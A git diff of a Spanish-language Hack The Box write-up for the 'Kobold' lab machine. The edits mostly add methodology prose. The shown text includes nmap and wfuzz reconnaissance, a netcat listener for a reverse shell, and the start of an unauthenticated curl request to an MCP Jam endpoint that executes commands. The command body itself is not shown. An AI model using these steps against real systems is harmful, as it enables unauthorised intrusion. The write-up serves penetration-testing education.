@@ -2,7 +2,7 @@
 layout: single
 title: "HTB Kobold - Writeup"
 date: 2026-04-10
-difficulty: Easy
+difficulty: Fácil
 operating_system: Linux
 service_hint: MCP Jam API + PrivateBin + Arcane
 summary: "Cadena de explotación: RCE sin autenticación en MCP Jam, abuso de PrivateBin para ejecutar PHP, extracción de credenciales redactadas y escape al host a través de Arcane/Docker."
@@ -16,30 +16,32 @@ summary: "Cadena de explotación: RCE sin autenticación en MCP Jam, abuso de Pr
 |-------|-------|
 | IP | `10.129.31.14` |
 | Sistema operativo | Linux |
-| Dificultad | Easy |
-| Servicios clave | `mcp.kobold.htb`, `bin.kobold.htb`, Arcane en `:3552` |
+| Dificultad | Fácil |
+| Tags | `RCE`, `LFI`, `Path Traversal`, `Reutilización de credenciales`, `Escalada de privilegios con Docker` |
 
 ## Reconocimiento
 
-Este primer escaneo sirve para detectar puertos abiertos con rapidez antes de profundizar en cada servicio.
+Como en cualquier ejercicio de pentest o HTB, el objetivo inicial no es "tirar exploits", sino construir contexto tecnico suficiente para priorizar superficies de ataque. Para eso se combinaron `nmap` y `wfuzz`.
+
+Este primer escaneo con `nmap` sirve para detectar puertos abiertos rapidamente y reducir la superficie a analizar.
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn 10.129.31.14
 ```
 
-Este segundo escaneo identifica versiones, banners y detalles utiles para decidir por donde atacar.
+Una vez identificados los puertos expuestos, este segundo escaneo profundiza en versiones, banners, titulos HTTP y fingerprints de servicio.
 
 ```bash
 nmap -p22,80,443,3552 -sCV 10.129.31.14
 ```
 
-Los hallazgos importantes fueron:
+Los indicadores mas utiles de esta fase fueron:
 
-- `80/tcp` y `443/tcp` redirigen a `kobold.htb`.
-- El certificado TLS expone `kobold.htb` y `*.kobold.htb`.
-- `3552/tcp` responde con una aplicacion web Go que despues resulta ser Arcane.
+- `80/tcp` y `443/tcp` redirigen a `kobold.htb`, lo que obliga a trabajar con nombre virtual y no solo con IP.
+- El certificado TLS expone `kobold.htb` y `*.kobold.htb`, una pista clara de que puede haber subdominios adicionales.
+- `3552/tcp` devuelve una aplicacion HTTP basada en Go, con una respuesta tipo SPA y rutas como `/api/app-images/favicon`, lo que sugiere una consola web moderna o panel administrativo.
 
-Este fuzzing de virtual hosts aprovecha el wildcard del certificado para descubrir subdominios utiles.
+Con ese contexto, el siguiente paso logico es fuzzear virtual hosts. `wfuzz` se usa aqui no como fuerza bruta ciega, sino como tecnica de expansion de superficie aprovechando el wildcard del certificado.
 
 ```bash
 wfuzz -H "Host: FUZZ.kobold.htb" --hc 404,403 --hh=154 \
@@ -52,15 +54,45 @@ Subdominios relevantes:
 - `mcp.kobold.htb` -> MCP Jam
 - `bin.kobold.htb` -> PrivateBin
 
+Ese resultado ya ordena la investigacion: `bin` apunta a un producto conocido y `mcp` sugiere una aplicacion mas especializada, probablemente con endpoints API propios.
+
+## Metodología de análisis del vector inicial
+
+El punto de entrada no se eligio al azar. Se priorizo `mcp.kobold.htb` por tres motivos:
+
+1. El nombre del subdominio y la propia aplicacion sugerian una interfaz orientada a integracion o orquestacion, algo que suele exponer endpoints JSON y operaciones de backend.
+2. La respuesta del servicio en `3552/tcp` mostraba una SPA sin demasiada informacion visual, lo que normalmente obliga a inspeccionar trafico, recursos cargados y llamadas XHR/fetch.
+3. En entornos reales, cualquier funcionalidad que permita "conectar", "probar", "ejecutar" o "registrar" servidores externos merece revisarse primero, porque muchas veces termina encapsulando ejecucion de procesos en el host.
+
+Las notas fuente no conservan una captura del proceso exacto de discovery dentro del navegador, asi que no puedo afirmar con evidencia directa si `/api/mcp/connect` se obtuvo desde DevTools, desde el codigo cliente o desde documentacion expuesta. Lo que si puedo afirmar es que el camino metodologicamente correcto y coherente con el resto de evidencias habria sido este:
+
+- abrir la aplicacion en navegador y usar **DevTools / Network tab** para identificar endpoints `POST`, payloads JSON y nombres de rutas con semantica operativa;
+- revisar el JavaScript servido al cliente en busca de rutas `/api/...`, nombres de funciones y estructuras de payload;
+- repetir las peticiones fuera del navegador con `curl`, para aislar comportamiento y verificar si existe autenticacion real o solo validacion del lado cliente;
+- buscar el nombre del producto (`MCP Jam`, `McpJam`, rutas observadas, mensajes de error) en **Google**, **GitHub**, **searchsploit**, **NVD** y buscadores de **CVE** para ver si existe una vulnerabilidad publica o un issue conocido.
+
+## Investigación de vulnerabilidades y señales de riesgo
+
+En una evaluacion profesional, la investigacion de CVE/exploits no reemplaza la validacion manual; la complementa. En este caso, la prioridad no era encontrar un identificador CVE bonito, sino responder una pregunta mucho mas importante: "¿el backend acepta instrucciones del cliente que terminan creando un proceso en el host?" Como referencia adicional para quien quiera investigar el vector de MCP Jam, puede revisarse `CVE-2026-23744`, sin necesidad de apoyarse en esa referencia para sostener la explotacion observada aqui.
+
+Los indicadores tecnicos que vuelven a `/api/mcp/connect` especialmente sospechoso son muy fuertes:
+
+- el nombre del endpoint, `connect`, sugiere inicializacion de una integracion o servidor externo;
+- el payload observado incluye claves como `serverConfig`, `command`, `args` y `env`, que son exactamente los campos que uno esperaria al construir una llamada a `execve`, `spawn`, `fork/exec` o equivalente;
+- si un cliente puede enviar el binario a ejecutar y su lista de argumentos, la frontera entre "funcionalidad" y "RCE" desaparece por completo;
+- la ausencia de evidencia de autenticacion fuerte en la peticion convierte el hallazgo en un candidato inmediato a validacion manual.
+
+Dicho de forma simple: cuando una API acepta desde el cliente algo semantica y estructuralmente equivalente a `command + args + env`, ya no estamos ante una simple mala practica. Estamos ante un patron de diseño extremadamente cercano a ejecucion remota de comandos, y hay que validarlo de inmediato.
+
 ## Acceso inicial con MCP Jam
 
-Primero conviene preparar un listener para recibir la reverse shell.
+Antes de probar una posible ejecucion remota, se prepara un listener con `nc` para recibir una reverse shell y evitar perder tiempo una vez confirmada la explotacion.
 
 ```bash
 nc -nlvp 4444
 ```
 
-El endpoint `/api/mcp/connect` permite indicar el binario y los argumentos que ejecutara el servidor. En esta maquina eso produce RCE sin autenticacion.
+Una vez identificado el endpoint sospechoso, `curl` permite reproducir la peticion manualmente y comprobar si el servidor ejecuta el comando especificado en el JSON. Se utiliza `curl` porque elimina cualquier dependencia del cliente web y deja claro que la logica vulnerable esta en el backend.
 
 ```bash
 curl -k https://mcp.kobold.htb/api/mcp/connect \
@@ -75,7 +107,9 @@ curl -k https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-Este comando solo confirma el contexto de la shell obtenida y revela un dato clave para la escalada: `ben` pertenece al grupo `operator`.
+La ejecucion de esta peticion devuelve una shell como `ben`, lo que valida la hipotesis de RCE sin necesidad de apoyarse en un exploit publico ni en una CVE confirmada.
+
+Este comando contextualiza la shell obtenida y revela un dato clave para la siguiente fase: `ben` pertenece al grupo `operator`.
 
 ```bash
 id
